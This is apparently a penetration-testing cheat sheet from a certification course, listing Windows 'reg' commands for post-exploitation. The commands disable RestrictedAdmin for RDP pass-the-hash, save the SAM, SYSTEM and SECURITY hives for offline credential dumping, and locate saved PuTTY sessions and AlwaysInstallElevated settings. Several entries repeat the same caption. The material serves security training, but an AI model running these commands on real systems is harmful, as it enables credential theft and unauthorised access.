# Windows reg

% reg, windows, cpts

## Windows reg - Windows reg - Windows reg - Windows reg - bypass-rdp-restriction
#cat/POSTEXPLOIT #cpts
![fddc9e41b60a15c084dae3860c3dd239.png](:/0b26142114924f2b9bada93af9297262)

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Windows reg - Windows reg - Windows reg - Windows reg - backing-up-sam-and-system-registry-hives
#cat/POSTEXPLOIT #cpts
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```
cmd-session
```

## Windows reg - Windows reg - Windows reg - Windows reg - enumerating-sessions-and-finding-credentials
#cat/POSTEXPLOIT #cpts
First, we need to enumerate the available saved sessions:

```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

## Windows reg - Windows reg - Windows reg - Windows reg - enumerating-always-install-elevated-settings
#cat/POSTEXPLOIT #cpts
Let's enumerate this setting.

```
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

## Windows reg - Windows reg - Windows reg - Windows reg - enumerating-always-install-elevated-settings-2
#cat/POSTEXPLOIT #cpts
```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
```

## Windows reg - Windows reg - Windows reg - Windows reg - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the
#cat/POSTEXPLOIT #cpts
Thereafter, students need to change directories to `C:\DotNetNuke\Portals\0\` to save copies of the SAM database registry hives within it:

```
cd c:\dotnetnuke\portals\0\
```

## Windows reg - Windows reg - Windows reg - Windows reg - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-2
#cat/POSTEXPLOIT #cpts
Thereafter, students need to change directories to `C:\DotNetNuke\Portals\0\` to save copies of the SAM database registry hives within it:

```
reg save HKLM\SYSTEM SYSTEM.SAVE
```

## Windows reg - Windows reg - Windows reg - Windows reg - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-3
#cat/POSTEXPLOIT #cpts
Thereafter, students need to change directories to `C:\DotNetNuke\Portals\0\` to save copies of the SAM database registry hives within it:

```
reg save HKLM\SECURITY SECURITY.SAVE
```

## Windows reg - Windows reg - Windows reg - Windows reg - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-4
#cat/POSTEXPLOIT #cpts
Thereafter, students need to change directories to `C:\DotNetNuke\Portals\0\` to save copies of the SAM database registry hives within it:

```
reg save HKLM\SAM SAM.SAVE
```

